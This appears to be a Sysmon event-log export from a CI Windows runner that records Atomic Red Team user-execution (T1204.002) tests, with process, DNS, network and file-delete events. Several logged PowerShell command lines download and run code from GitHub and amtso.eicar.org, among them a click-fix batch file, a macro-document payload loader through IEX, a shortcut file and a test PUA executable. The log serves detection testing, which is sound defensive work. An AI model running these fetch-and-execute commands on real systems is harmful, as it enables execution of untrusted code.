ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:58 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:58.877
ProcessGuid: {f995aebf-62c2-6942-6304-000000000e00}
ProcessId: 10148
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:58 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:58.873
ProcessGuid: {f995aebf-62c2-6942-6404-000000000e00}
ProcessId: 4052
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:58 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:58.645
ProcessGuid: {f995aebf-62c2-6942-6004-000000000e00}
ProcessId: 9416
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:58 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:58.421
ProcessGuid: {f995aebf-62c2-6942-6004-000000000e00}
ProcessId: 9416
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ts5hugqi.a0l.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:58 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:58.328
ProcessGuid: {f995aebf-62c2-6942-6004-000000000e00}
ProcessId: 9416
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$url = \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat\""""
$outfile = \""""$env:TEMP\click-fix.bat\""""
Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing
$process = Start-Process -FilePath $outfile -PassThru -WindowStyle Normal
$process.Id | Out-File \""""$env:TEMP\click-fix-pid.txt\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:57 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:57.904
ProcessGuid: {f995aebf-62c1-6942-5e04-000000000e00}
ProcessId: 9856
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_n5l2fnor.y0s.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:57 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:57.299
ProcessGuid: {f995aebf-62c1-6942-5c04-000000000e00}
ProcessId: 1828
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2r133nvq.k5w.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:56 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:56.905
ProcessGuid: {f995aebf-62c0-6942-5b04-000000000e00}
ProcessId: 5392
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:56 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:56.885
ProcessGuid: {f995aebf-62c0-6942-5b04-000000000e00}
ProcessId: 5392
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:50 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:50.745
ProcessGuid: {f995aebf-62ba-6942-5a04-000000000e00}
ProcessId: 1236
Image: C:\Users\RUNNER~1\AppData\Local\Temp\a.exe
ImageLoaded: C:\Users\RUNNER~1\AppData\Local\Temp\a.exe
FileVersion: Release 0.83 (with embedded help)
Description: SSH, Telnet, Rlogin, and SUPDUP client
Product: PuTTY suite
Company: Simon Tatham
OriginalFileName: PuTTY
Hashes: SHA256=16CBE40FB24CE2D422AFDDB5A90A5801CED32EF52C22C2FC77B25A90837F28AD
Signed: true
Signature: Simon Tatham
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:50 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:50.735
ProcessGuid: {f995aebf-62ba-6942-5a04-000000000e00}
ProcessId: 1236
Image: C:\Users\RUNNER~1\AppData\Local\Temp\a.exe
FileVersion: Release 0.83 (with embedded help)
Description: SSH, Telnet, Rlogin, and SUPDUP client
Product: PuTTY suite
Company: Simon Tatham
OriginalFileName: PuTTY
CommandLine: ""C:\Users\RUNNER~1\AppData\Local\Temp\a.exe"" 
CurrentDirectory: C:\Windows\System32\WindowsPowerShell\v1.0\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=16CBE40FB24CE2D422AFDDB5A90A5801CED32EF52C22C2FC77B25A90837F28AD
ParentProcessGuid: {f995aebf-62b6-6942-5604-000000000e00}
ParentProcessId: 9280
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\a.exe;start-process $env:TEMP\a.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:50 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:47.767
ProcessGuid: {f995aebf-62b6-6942-5604-000000000e00}
ProcessId: 9280
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52087
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 93.93.131.124
DestinationHostname: the.earth.li
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:49 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:47.667
ProcessGuid: {f995aebf-62b6-6942-5604-000000000e00}
ProcessId: 9280
QueryName: the.earth.li
QueryStatus: 0
QueryResults: ::ffff:93.93.131.124;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:48 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:46.569
ProcessGuid: {f995aebf-62b6-6942-5404-000000000e00}
ProcessId: 1196
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:48 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:46.574
ProcessGuid: {f995aebf-62b6-6942-5404-000000000e00}
ProcessId: 1196
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52086
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:47 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:47.772
ProcessGuid: {f995aebf-62b6-6942-5604-000000000e00}
ProcessId: 9280
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:47 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:45.646
ProcessGuid: {f995aebf-62b5-6942-5204-000000000e00}
ProcessId: 6392
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:47 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:47.400
ProcessGuid: {f995aebf-62b6-6942-5604-000000000e00}
ProcessId: 9280
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f0wsoibk.2ni.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:47 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:45.651
ProcessGuid: {f995aebf-62b5-6942-5204-000000000e00}
ProcessId: 6392
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52085
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:47 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:44.711
ProcessGuid: {f995aebf-62b4-6942-4f04-000000000e00}
ProcessId: 7420
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52084
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 81.7.7.163
DestinationHostname: -
DestinationPort: 80
DestinationPortName: http"
"12/17/2025 7:58:47 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:47.059
ProcessGuid: {f995aebf-62b6-6942-5904-000000000e00}
ProcessId: 8436
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:46 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:46.926
ProcessGuid: {f995aebf-62b6-6942-5704-000000000e00}
ProcessId: 4472
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:46 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:46.924
ProcessGuid: {f995aebf-62b6-6942-5804-000000000e00}
ProcessId: 8372
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:46 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:46.578
ProcessGuid: {f995aebf-62b6-6942-5404-000000000e00}
ProcessId: 1196
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:46 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:44.597
ProcessGuid: {f995aebf-62b4-6942-4f04-000000000e00}
ProcessId: 7420
QueryName: amtso.eicar.org
QueryStatus: 0
QueryResults: ::ffff:81.7.7.163;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:46.360
ProcessGuid: {f995aebf-62b6-6942-5404-000000000e00}
ProcessId: 1196
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ef4qbakm.ps5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:46 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:46.266
ProcessGuid: {f995aebf-62b6-6942-5404-000000000e00}
ProcessId: 1196
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-WebRequest -OutFile $env:Temp\test10.lnk \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\""""
$file1 = \""""$env:Temp\test10.lnk\""""
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:45 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:58:45.656
ProcessGuid: {f995aebf-62b5-6942-5204-000000000e00}
ProcessId: 6392
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:45 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:43.395
ProcessGuid: {f995aebf-62b3-6942-4d04-000000000e00}
ProcessId: 9124
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:45 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:45.419
ProcessGuid: {f995aebf-62b5-6942-5204-000000000e00}
ProcessId: 6392
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kxniwqh0.5dp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:58:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:45.324
ProcessGuid: {f995aebf-62b5-6942-5204-000000000e00}
ProcessId: 6392
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macroCode = Get-Content \""""C:\AtomicRedTeam\atomics/T1204.002/src/test9-GenericPayloadDownload.txt\"""" -Raw
$URL = \""""\"""" + \""""/\"""" + \""""\""""
$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt\""""
Invoke-MalDoc -macroCode $macroCode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:45 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:45.048
ProcessGuid: {f995aebf-62b5-6942-5104-000000000e00}
ProcessId: 8632
Image: C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe
ImageLoaded: C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732
Signed: false
Signature: -
SignatureStatus: Unavailable
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:45.043
ProcessGuid: {f995aebf-62b5-6942-5104-000000000e00}
ProcessId: 8632
Image: C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: ""C:\Users\RUNNER~1\AppData\Local\Temp\PotentiallyUnwanted.exe""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732
ParentProcessGuid: {f995aebf-62b4-6942-4f04-000000000e00}
ParentProcessId: 7420
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
& \""""$env:TEMP/PotentiallyUnwanted.exe\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:44 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:43.399
ProcessGuid: {f995aebf-62b3-6942-4d04-000000000e00}
ProcessId: 9124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52083
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:58:44 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:44.092
ProcessGuid: {f995aebf-62b4-6942-4f04-000000000e00}
ProcessId: 7420
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_dgzefwqv.ruu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
